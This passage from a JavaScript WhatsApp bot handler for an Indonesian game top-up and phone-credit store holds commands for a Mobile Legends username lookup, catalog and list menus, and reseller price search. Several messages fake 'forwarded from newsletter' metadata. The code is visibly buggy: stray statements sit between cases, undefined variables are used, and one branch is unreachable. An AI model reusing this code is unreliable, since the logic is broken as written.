case 'mlstalk': {
    if (!text) {
        return sycreply(`Contoh penggunaan:\n${prefix + command} id|zona id\n\nEx.\n${prefix + command} 157228049|2241`);
    }

    async function mlstalk(id, zoneId) {
        return new Promise((resolve, reject) => {
            axios
                .post(
                    'https://api.duniagames.co.id/api/transaction/v1/top-up/inquiry/store',
                    new URLSearchParams(
                        Object.entries({
                            productId: '1',
                            itemId: '2',
                            catalogId: '57',
                            paymentId: '352',
                            gameId: id,
                            zoneId: zoneId,
                            product_ref: 'REG',
                            product_ref_denom: 'AE',
                        })
                    ),
                    {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                            Referer: 'https://www.duniagames.co.id/',
                            Accept: 'application/json',
                        },
                    }
                )
                .then((response) => {
                    resolve(response.data.data.gameDetail);
                })
                .catch((err) => {
                    reject(err);
                });
        });
    }

    // Ambil data dari API
    const [id, zoneId] = text.split('|');
    const { userName } = await mlstalk(id, zoneId).catch(() => {
        return sycreply("User tidak ditemukan");
    });

    const vf = `■ 「 *${n}MOBILE LEGENDS STALK${n}* 」\n
${f}*Username* : *${n}${userName || "Kosong"}${n}*\n
${f}*ID* : *${n}${id}${n}*\n
${f}*ZonaId* : *${n}${zoneId}${n}*\n`;

    const sections = [
        {
            title: "Silahkan Pilih Button di Bawah",
            highlight_label: "Powered by Galangxyz",
            rows: [
                {
                    title: "Product",
                    description: "List All Product.",
                    id: `${prefix}product`,
                },
                {
                    title: "Top Up",
                    description: "Intruksi Top up",
                    id: `${prefix}topup`,
                },
            ],
        },
    ];

    const listMessage = {
        title: `Mau Topup? Disini!`,
        sections,
    };

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        contextInfo: {
                            mentionedJid: [m.sender],
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: "120363373320014871@newsletter",
                                newsletterName: "Powered By Galangxyz",
                                serverMessageId: -1,
                            },
                            businessMessageForwardInfo: {
                                businessOwnerJid: sych.decodeJid(sych.user.id),
                            },
                        },
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: vf,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "Powered By Galangxyz",
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            title: "Topup Produk",
                            subtitle: "Pilih opsi yang tersedia.",
                            hasMediaAttachment: false,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                ...sections.map((section) => ({
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify(listMessage),
                                })),
                                {
                                    name: "cta_copy",
        buttonParamsJson: JSON.stringify({
            display_text: "ID",
            copy_code: `${id}`
                                    }),
                                },
                                {
                                    name: "cta_copy",
        buttonParamsJson: JSON.stringify({
            display_text: "Username",
            copy_code: `${userName || "Kosong"}`
                                    }),
                                },
                            ],
                        }),
                    }),
                },
            },
        },
        { quoted: fkontak }
    );

    // Kirim pesan
    await sych.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id,
    });

    
}
break;

//Feature
case 'test': {
    if (global.lastMessageId) {
        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
    }
                sycreply('Ok, Success!');
                 // Simpan ID pesan terkirim untuk penghapusan otomatis
    global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim

                break;
            }

            case 'totalfitur': {
                if (global.lastMessageId) {
        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
    }
                const totalFitur = (fs.readFileSync('./naze.js').toString().match(new RegExp('break', 'g')) || []).length - 1;
                
              

                sycreply(`Jumlah fitur saat ini: ${totalFitur}`);
                   // Simpan ID pesan terkirim untuk penghapusan otomatis
    global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim

                break;
            }

            case 'whoami': {
                    if (!isCreator) return sycreply(mess.owner);
                     return sycreply('Anda adalah pengguna bot.');

                if (isOwner) {
                    sycreply('Anda adalah owner bot.');
                } else if (isMe) {
                    sycreply('Anda adalah bot.');
                } else {
                    sycreply('Anda adalah bot sekaligus owner bot nya.');
                }

                break;
            }
            
case 'owner_menu':
            case 'menu_owner': {
            const name = getUserName(m.sender);
                if (global.lastMessageId) {
        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
    }
                if (!isCreator) return sycreply('❌ Kamu tidak memiliki izin untuk menggunakan fitur ini.');

                const menu = `*\`Hai ${name}\`*

- ${prefix}buy <code,target>
- ${prefix}check_balance
- ${prefix}wd_balance <nominal>
`;

                sycreply(menu);
                 // Simpan ID pesan terkirim untuk penghapusan otomatis
    global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim

                break;
            }

if (msg.product && msg.product.productImage) {
    let productImage = msg.product.productImage;

    console.log("✅ Gambar Produk Ditemukan!");
    console.log("🔗 URL:", productImage.url);
    console.log("📝 MIME Type:", productImage.mimetype);
    console.log("📏 File Size:", productImage.fileLength);
    console.log("🔑 Media Key:", productImage.mediaKey);
    console.log("📸 Thumbnail:", productImage.jpegThumbnail);
} else {
    console.log("❌ Tidak ada gambar produk dalam pesan ini.");
}


case "menucatalog": {
     

    try {
    
    
        let menu = `Halo ${m.pushName ? m.pushName : 'Tanpa Nama'}, Welcome ke katalog kami!`;

        // Membuat pesan katalog dengan gambar eksternal
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
            },
            productMessage: {
                product: {
                    productImage: {
                        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPO0xx8wj-yC22H5a8y77wnqiuDocaXKcWwrM7NdXp3qrCIlyfg8DOrl_rdyjmnsHd7DuxbflVI6sagEtFf-phCVDQymWsdDMT570nfxA?ccb=9-4&oh=01_Q5AaIJgQB7je7zNYpSKyrZereWgyMw4vd-lwYeo0U_0gAQhh&oe=67C79978&_nc_sid=e6ed6c&mms3=true",
                        mimetype: "image/jpeg",
                        fileSha256: "T3/s9mIeDZaVkg3TVeEDWwOPdEIcY5pOWbNTuU8LZLk=",
                        fileEncSha256: "MUT7J+sx3ySh4a49wxlhqoxI1LbOGV6JrId49oCGvoc=",
                        mediaKey: "Pg5gueOYm9s7ENS74rtF88IuBa1vcyVBcmznZm3PiNE=",
                        fileLength: { low: 14892, high: 0, unsigned: true },
                        height: 500,
                        width: 500,
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAD8APwMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAgUGBAMBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA0glAAAEDkzEJ3XZe5HqTU+9VaSQqbqJkefYUV3w2kL9JiZAAAA//xAAmEAACAQMEAAYDAAAAAAAAAAABAgMABBEFEhMhECAjMUBRIkFC/9oACAEBAAE/APhXt6lpHn3apNUvZW6fbSX13auBI4eor62ljD8gpbmBjgSDxd0QZZgBWpXHPdnBytcUfXQqSL0c/wBZrTTwFuSPOaWGS5IzGI0odCpWZI2ZRkgUskJ/Obc7/WOhVzHE0skm3ANbIzjA/WfeuNAMA9GtKtvVklI8m1foVPbRToVdak0SUNmKSoNEIbM0lIixqFUYA+H/AP/EABgRAQADAQAAAAAAAAAAAAAAAAEAECAR/9oACAECAQE/AMhEvsXX/8QAGxEAAgMAAwAAAAAAAAAAAAAAAQIAESAQMkH/2gAIAQMBAT8AyqloQV5DUOsZgfK1/9k="
                    },
                    productId: "9103360316413843",
                    currencyCode: "USD",
                    priceAmount1000: { low: 1316133912, high: 2328, unsigned: false },
                    title: "RKA STORE ©Powered by Langz",
                    description: "RKA STORE\n\n" +
    "Halo Welcome\n" +
    "RKA STORE berkomitmen untuk memberikan pengalaman belanja yang mudah, nyaman, dan aman. Dengan layanan cepat serta responsif, kami siap membantu Anda kapan saja. \n\n" +
    "RKA STORE – Terintegrasi Dengan API, Belanja Mudah, Cepat, & Aman!\n\n" +
    "Daftar kategori produk yang tersedia di bawah ini:\n\n" +
    "╭─❍「 Game Populer 」❍\n" +
    "│✧ MLBB\n" +
    "│✧ ML_WDP\n" +
    "│✧ ML_SL\n" +
    "│✧ ML_TL\n" +
    "│✧ Hok\n" +
    "│✧ AOV\n" +
    "│✧ LOL\n" +
    "│✧ COC\n" +
    "│✧ FF\n" +
    "│✧ PUBG\n" +
    "╰────❍\n\n" +
    "╭─❍「 Data Internet 」❍\n" +
    "│✧ BYU DATA\n" +
    "│✧ TELKOMSEL DATA\n" +
    "│✧ XL DATA\n" +
    "│✧ AXIS DATA\n" +
    "│✧ ISAT DATA\n" +
    "│✧ TRI DATA\n" +
    "╰────❍\n\n" +
    "╭─❍「 Pulsa Reguler & Transfer 」❍\n" +
    "│✧ BYU PULSA\n" +
    "│✧ TELKOMSEL PULSA\n" +
    "│✧ XL PULSA\n" +
    "│✧ AXIS PULSA\n" +
    "│✧ ISAT PULSA\n" +
    "│✧ TRI PULSA\n" +
    "╰────❍\n\n" +
    "╭─❍「 Voucher 」❍\n" +
    "│✧ PLN\n" +
    "╰────❍",
                    productImageCount: 1
                },
                businessOwnerJid: "17089003182@s.whatsapp.net",
                contextInfo: {
                    mentionedJid: [m.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363373320014871@newsletter',
                        newsletterName: 'Powered By Galangxyz',
                        serverMessageId: -1
                    }
                    }
            }
        }
    }
}, { quoted: m });
        // Simpan ID pesan terkirim untuk penghapusan otomatis jika diperlukan
        

        // Relay pesan katalog
        await sych.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
        
        console.log('Catalog berhasil dikirim!');
    } catch (e) {
        console.error('Error mengirim catalog:', e.message);
        sycreply('Terjadi kesalahan saat mengirim katalog!');
    }
}
break;

case 't1': {
    console.log("Mempersiapkan pesan template...");

    let anu = `Halo ${m.pushName ? m.pushName : 'Tanpa Nama'}, selamat datang di RKA STORE!`;
    console.log("Pesan template: ", anu);

    // Membuat template pesan
    let template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                // Menambahkan contextInfo di sini
                contextInfo: {
                    mentionedJid: [m.sender], // Menyebut pengirim sebagai mention
                    isForwarded: true, // Menandakan bahwa pesan ini diteruskan
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363373320014871@newsletter', // ID newsletter
                        newsletterName: 'Powered By Galangxyz', // Nama newsletter
                        serverMessageId: -1 // ID pesan server
                    }
                },
                templateMessage: {
                    hydratedTemplate: {
                        hydratedContentText: anu,
                        hydratedFooterText: "RKA STORE ©Powered by Langz",
                        hydratedButtons: [
                            {
                                urlButton: {
                                    displayText: '🔗 Instagram',
                                    url: 'https://instagram.com/iamkizakixd'
                                }
                            },
                            {
                                callButton: {
                                    displayText: '📞 Owner Number',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            },
                            {
                                quickReplyButton: {
                                    displayText: '⚡ Speed',
                                    id: 'ping'
                                }
                            },
                            {
                                quickReplyButton: {
                                    displayText: '📜 Script',
                                    id: 'sc'
                                }
                            },
                            {
                                quickReplyButton: {
                                    displayText: '👑 Owner',
                                    id: 'owner'
                                }
                            }
                        ]
                    }
                }
            }
        }
    }), { userJid: m.chat, quoted: m });

    // Mengecek template yang telah dibuat
    console.log("Template pesan yang dikirim: ", template.message);

    console.log("Mengirim pesan...");
    
    // Mengirim pesan
    try {
        await sych.relayMessage(m.chat, template.message, { messageId: template.key.id });
        console.log("Pesan berhasil dikirim!");
    } catch (error) {
        console.error("Error mengirim pesan: ", error);
    }
}
break;


console.log(msg.product.productImage);
console.log("Product Image URL:", productImage.url);
console.log("Product ID:", productId);
console.log("Price:", priceAmount1000);
console.log("Product Image:", JSON.stringify(msg.product.productImage, null, 2));

case 'product':
case 'list': {

        let menu = `Halo ${m.pushName ? m.pushName : 'Tanpa Nama'}, Welcome ke katalog kami!`;

        // Membuat pesan katalog dengan gambar eksternal
let katalogMsg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
            },
            productMessage: {
                product: {
                    productImage: {
                        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPO0xx8wj-yC22H5a8y77wnqiuDocaXKcWwrM7NdXp3qrCIlyfg8DOrl_rdyjmnsHd7DuxbflVI6sagEtFf-phCVDQymWsdDMT570nfxA?ccb=9-4&oh=01_Q5AaIJgQB7je7zNYpSKyrZereWgyMw4vd-lwYeo0U_0gAQhh&oe=67C79978&_nc_sid=e6ed6c&mms3=true",
                        mimetype: "image/jpeg",
                        fileSha256: "T3/s9mIeDZaVkg3TVeEDWwOPdEIcY5pOWbNTuU8LZLk=",
                        fileEncSha256: "MUT7J+sx3ySh4a49wxlhqoxI1LbOGV6JrId49oCGvoc=",
                        mediaKey: "Pg5gueOYm9s7ENS74rtF88IuBa1vcyVBcmznZm3PiNE=",
                        fileLength: { low: 14892, high: 0, unsigned: true },
                        height: 500,
                        width: 500,
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAD8APwMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAgUGBAMBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA0glAAAEDkzEJ3XZe5HqTU+9VaSQqbqJkefYUV3w2kL9JiZAAAA//xAAmEAACAQMEAAYDAAAAAAAAAAABAgMABBEFEhMhECAjMUBRIkFC/9oACAEBAAE/APhXt6lpHn3apNUvZW6fbSX13auBI4eor62ljD8gpbmBjgSDxd0QZZgBWpXHPdnBytcUfXQqSL0c/wBZrTTwFuSPOaWGS5IzGI0odCpWZI2ZRkgUskJ/Obc7/WOhVzHE0skm3ANbIzjA/WfeuNAMA9GtKtvVklI8m1foVPbRToVdak0SUNmKSoNEIbM0lIixqFUYA+H/AP/EABgRAQADAQAAAAAAAAAAAAAAAAEAECAR/9oACAECAQE/AMhEvsXX/8QAGxEAAgMAAwAAAAAAAAAAAAAAAQIAESAQMkH/2gAIAQMBAT8AyqloQV5DUOsZgfK1/9k="
                    },
                    productId: "9103360316413843",
                    currencyCode: "USD",
                    priceAmount1000: { low: 1316133912, high: 2328, unsigned: false },
                    title: "RKA STORE ©Powered by Langz",
                    description: "RKA STORE\n\n" +
    "Halo Welcome\n" +
    "RKA STORE berkomitmen untuk memberikan pengalaman belanja yang mudah, nyaman, dan aman. Dengan layanan cepat serta responsif, kami siap membantu Anda kapan saja. \n\n" +
    "RKA STORE – Terintegrasi Dengan API, Belanja Mudah, Cepat, & Aman!\n\n" +
    "Daftar kategori produk yang tersedia di bawah ini:\n\n" +
    "╭─❍「 Game Populer 」❍\n" +
    "│✧ MLBB\n" +
    "│✧ ML_WDP\n" +
    "│✧ ML_SL\n" +
    "│✧ ML_TL\n" +
    "│✧ Hok\n" +
    "│✧ AOV\n" +
    "│✧ LOL\n" +
    "│✧ COC\n" +
    "│✧ FF\n" +
    "│✧ PUBG\n" +
    "╰────❍\n\n" +
    "╭─❍「 Data Internet 」❍\n" +
    "│✧ BYU DATA\n" +
    "│✧ TELKOMSEL DATA\n" +
    "│✧ XL DATA\n" +
    "│✧ AXIS DATA\n" +
    "│✧ ISAT DATA\n" +
    "│✧ TRI DATA\n" +
    "╰────❍\n\n" +
    "╭─❍「 Pulsa Reguler & Transfer 」❍\n" +
    "│✧ BYU PULSA\n" +
    "│✧ TELKOMSEL PULSA\n" +
    "│✧ XL PULSA\n" +
    "│✧ AXIS PULSA\n" +
    "│✧ ISAT PULSA\n" +
    "│✧ TRI PULSA\n" +
    "╰────❍\n\n" +
    "╭─❍「 Voucher 」❍\n" +
    "│✧ PLN\n" +
    "╰────❍",
                    productImageCount: 1
                },
                businessOwnerJid: "17089003182@s.whatsapp.net",
                contextInfo: {
                    mentionedJid: [m.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363373320014871@newsletter',
                        newsletterName: 'Powered By Galangxyz',
                        serverMessageId: -1
                    }
                    }
            }
        }
    }
}, { quoted: m });
await sych.relayMessage(katalogMsg.key.remoteJid, katalogMsg.message, { messageId: katalogMsg.key.id });

        let locationMsg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "newsletterAdminInviteMessage": {
                        "newsletterJid": `120363396726721623@newsletter`,
                        "newsletterName": "RKA STORE",
                        "jpegThumbnail":  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAD8APwMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAgUGBAMBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA0glAAAEDkzEJ3XZe5HqTU+9VaSQqbqJkefYUV3w2kL9JiZAAAA//xAAmEAACAQMEAAYDAAAAAAAAAAABAgMABBEFEhMhECAjMUBRIkFC/9oACAEBAAE/APhXt6lpHn3apNUvZW6fbSX13auBI4eor62ljD8gpbmBjgSDxd0QZZgBWpXHPdnBytcUfXQqSL0c/wBZrTTwFuSPOaWGS5IzGI0odCpWZI2ZRkgUskJ/Obc7/WOhVzHE0skm3ANbIzjA/WfeuNAMA9GtKtvVklI8m1foVPbRToVdak0SUNmKSoNEIbM0lIixqFUYA+H/AP/EABgRAQADAQAAAAAAAAAAAAAAAAEAECAR/9oACAECAQE/AMhEvsXX/8QAGxEAAgMAAwAAAAAAAAAAAAAAAQIAESAQMkH/2gAIAQMBAT8AyqloQV5DUOsZgfK1/9k=", // Menggunakan Uint8Array yang valid
                        "caption": "\n\n⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂\n⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕\n⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂\n⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂\n⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔\n⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿\n⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿\n⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃\n⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈\n⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈\n⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈\n⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈\n⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈\n⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈\n\n",
                        "footer" : "Puki",
                        serverMessageId: 143,
                        "inviteExpiration": Date.now() + 1814400000 // 3 hari dari sekarang
                    }
                }
            }
        }, { userJid: m.chat, quoted: fkontak });


    await sych.relayMessage(m.chat, locationMsg.message, { messageId: locationMsg.key.id });
   

const name = getUserName(m.sender);
    // Hapus pesan sebelumnya jika ada
    if (global.lastMessageId) {
        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
    }

    let sections = [
        {
            title: 'Game Populer',
            highlight_label: 'Powered by Galangxyz',
            rows: [
                { id: `${prefix}mlbb`, title: "Mobile Legends: Bang Bang", description: "Top-up MLBB Diamond", },
                { id: `${prefix}ml_wdp`, title: "ML Wallet Diamond", description: "Top-up diamond untuk ML Wallet" },
                { id: `${prefix}ml_sl`, title: "ML Starlight", description: "Berlangganan Starlight ML" },
                { id: `${prefix}hok`, title: "Honor of Kings", description: "Top-up game Honor of Kings" },
                { id: `${prefix}aov`, title: "Arena of Valor", description: "Top-up game AOV" },
                { id: `${prefix}ff`, title: "Free Fire", description: "Top-up diamond Free Fire" },
                { id: `${prefix}pubg`, title: "PUBG Mobile", description: "Top-up UC untuk PUBG Mobile" },
            ],
        },
        {
            title: 'Data Internet',
            highlight_label: 'Powered by Galangxyz',
            rows: [
                { id: `${prefix}tsel_data`, title: "Telkomsel Data", description: "Paket data Telkomsel" },
                { id: `${prefix}xl_data`, title: "XL Data", description: "Paket data XL Axiata" },
                { id: `${prefix}tri_data`, title: "Tri Data", description: "Paket data Tri" },
            ],
        },
        {
            title: 'Pulsa Reguler & Transfer',
            highlight_label: 'Powered by Galangxyz',
            rows: [
                { id: `${prefix}tsel_pulsa`, title: "Telkomsel Pulsa", description: "Isi ulang pulsa Telkomsel" },
                { id: `${prefix}axis_pulsa`, title: "Axis Pulsa", description: "Isi ulang pulsa Axis" },
                { id: `${prefix}tri_pulsa`, title: "Tri Pulsa", description: "Isi ulang pulsa Tri" },
            ],
        },
        {
            title: 'Voucher',
            highlight_label: 'Powered by Galangxyz',
            rows: [
                { id: `${prefix}pln`, title: "PLN Voucher", description: "Voucher listrik PLN" },
            ],
        },
    ];

    let listMessage = {
        title: " Pilih Kategori!",
        text: `> RKA STORE berkomitmen untuk memberikan pengalaman belanja yang mudah, nyaman, dan aman. Dengan layanan cepat serta responsif, kami siap membantu Anda kapan saja. \n\n\nRKA STORE – Terintegrasi Dengan API, Belanja Mudah, Cepat, & Aman!\n\n𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃\n\nDaftar kategori produk yang tersedia di bawah ini: \n\n╭─❍「 *${n}Game Populer${n}* 」❍
│${setv} ${prefix}mlbb
│${setv} ${prefix}ml_wdp
│${setv} ${prefix}ml_sl
│${setv} ${prefix}ml_tl
│${setv} ${prefix}Hok
│${setv} ${prefix}Aov
│${setv} ${prefix}LOL
│${setv} ${prefix}COC
│${setv} ${prefix}FF
│${setv} ${prefix}PUBG
╰┬────❍
╭┴❍「 *${n}Data Internet${n}* 」❍
│${setv} ${prefix}BYU DATA
│${setv} ${prefix}TELKOMSEL DATA
│${setv} ${prefix}XL DATA
│${setv} ${prefix}AXIS DATA
│${setv} ${prefix}ISAT DATA
│${setv} ${prefix}TRI DATA
╰┬────❍
╭┴❍「 *${n}Pulsa Reguler & Transfer${n}* 」❍
│${setv} ${prefix}BYU PULSA 
│${setv} ${prefix}TELKOMSEL PULSA
│${setv} ${prefix}XL PULSA
│${setv} ${prefix}AXIS PULSA
│${setv} ${prefix}ISAT PULSA
│${setv} ${prefix}TRI PULSA
╰┬────❍
╭┴❍「 *${n}Vocher${n}* 」❍
│${setv} ${prefix}PLN
╰─────❍`,
        footer: `■ 「 *${n}BOT INFO${n}* 」
${f}*Nama Bot* : ${botname}
${f}*Powered* : @${'0@s.whatsapp.net'.split('@')[0]}
${f}*Owner* : @${owner[0].split('@')[0]}
${f}*Mode* : ${sych.public ? 'Public' : 'Self'}

■ 「 *${n}ABOUT${n}* 」
${f}*Tanggal* : ${tanggal}
${f}*Hari* : ${hari}
${f}*Jam* : ${jam} WIB`,
        buttonText: "Pilih Kategori",
        sections,
    };

    let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                    mentionedJid: [m.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363373320014871@newsletter',
                        newsletterName: 'Powered By Galangxyz',
                        serverMessageId: -1
                    },
                    businessMessageForwardInfo: {
                        businessOwnerJid: sych.decodeJid(sych.user.id)
                    },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: listMessage.text
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: listMessage.footer
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  
                locationMessage: {
                                degreesLatitude: 0,
                                degreesLongitude: 0,
                                name: "New York City, USA",
                                address: "Times Square, New York, USA"
                            },
                                                
                    title: `${n}Halo ${m.pushName ? m.pushName : 'Tanpa Nama'}, Welcome${n}`,
                    subtitle: "",
                    hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: "https://raw.githubusercontent.com/Galangxyz/Store/refs/heads/gh-pages/rka.jpg" } }, { upload: sych.waUploadToServer }))
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                        {
                            name: "single_select",
                            buttonParamsJson: JSON.stringify(listMessage)
                        }
                    ]
                })
            })
        }
    }
}, { quoted: fkontak });
   // Simpan ID pesan terkirim untuk penghapusan otomatis
    global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim

    await sych.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    break;
}
            case 'sr':
            case 'search': {
                if (!query) return sycreply(`Example: ${prefix}${command} MLW`);

                try {
                    const filterName = query;

                    const response = await axios.post(config.api.base_url + '/api/h2h/price-list/all', {
                        filter_name: filterName,
                        api_key: config.api.secret_key
                    }, {
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    });

                    const result = response.data;

                    if (!result.data) return sycreply(result.message);

                    let listText = '';
                    result.data.forEach(item => {
                        const profit = (config.api.profit / 100) * item.price;
                        const finalPrice = Number(item.price) + Number(Math.ceil(profit));
                        listText += `╭⟬ *${item.status} ${item.name}*\n` +
                            `┆•  Harga: Rp ${toRupiah(finalPrice)}\n` +
                            `┆•  Kode:  ${item.code}\n` +
                            `╰──────────◇\n\n`;
                    });

                    sycreply(listText);
                } catch (error) {
                    console.error('Error fetching data:', error);
                    sycreply('Barang yg anda cari tidak ditemukan.');
                }

                break;
            }

            case 'srbc':
            case 'search_by_code': {
                if (!query) return sycreply(`Example: ${prefix}${command} MLW`);

                try {
                    const filterCode = query.toUpperCase();

                    const response = await axios.post(config.api.base_url + '/api/h2h/price-list/all', {
                        filter_code: filterCode,
                        api_key: config.api.secret_key
                    }, {
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    });

                    const result = response.data;

                    if (!result.data) return sycreply(result.message);

                    let listText = '';
                    result.data.forEach(item => {
                        const profit = (config.api.profit / 100) * item.price;
                        const finalPrice = Number(item.price) + Number(Math.ceil(profit));
                        listText += `╭⟬ *${item.status} ${item.name}*\n` +
                            `┆•  Harga: Rp ${toRupiah(finalPrice)}\n` +
                            `┆•  Kode:  ${item.code}\n` +
                            `╰──────────◇\n\n`;
                    });

                    sycreply(listText);
                } catch (error) {
                    console.error('Error fetching data:', error);
                    sycreply('Produk yg anda cari tidak ditemukan.');
                }

                break;
            }




            case 'mlbb':
            case 'ml':
            case 'ml_wdp':
            case 'ml_sl':
            case 'ml_tl':
            case 'wdp':
            case 'starlight':
            case 'twilight':
            case 'hok':
            case 'aov':
            case 'lol':
            case 'coc':
            case 'ff':
            case 'pubg':

            case 'byu_data':
            case 'tsel_data':
            case 'xl_data':
            case 'axis_data':
            case 'isat_data':
            case 'tri_data':

            case 'byu_pulsa':
            case 'tsel_pulsa':
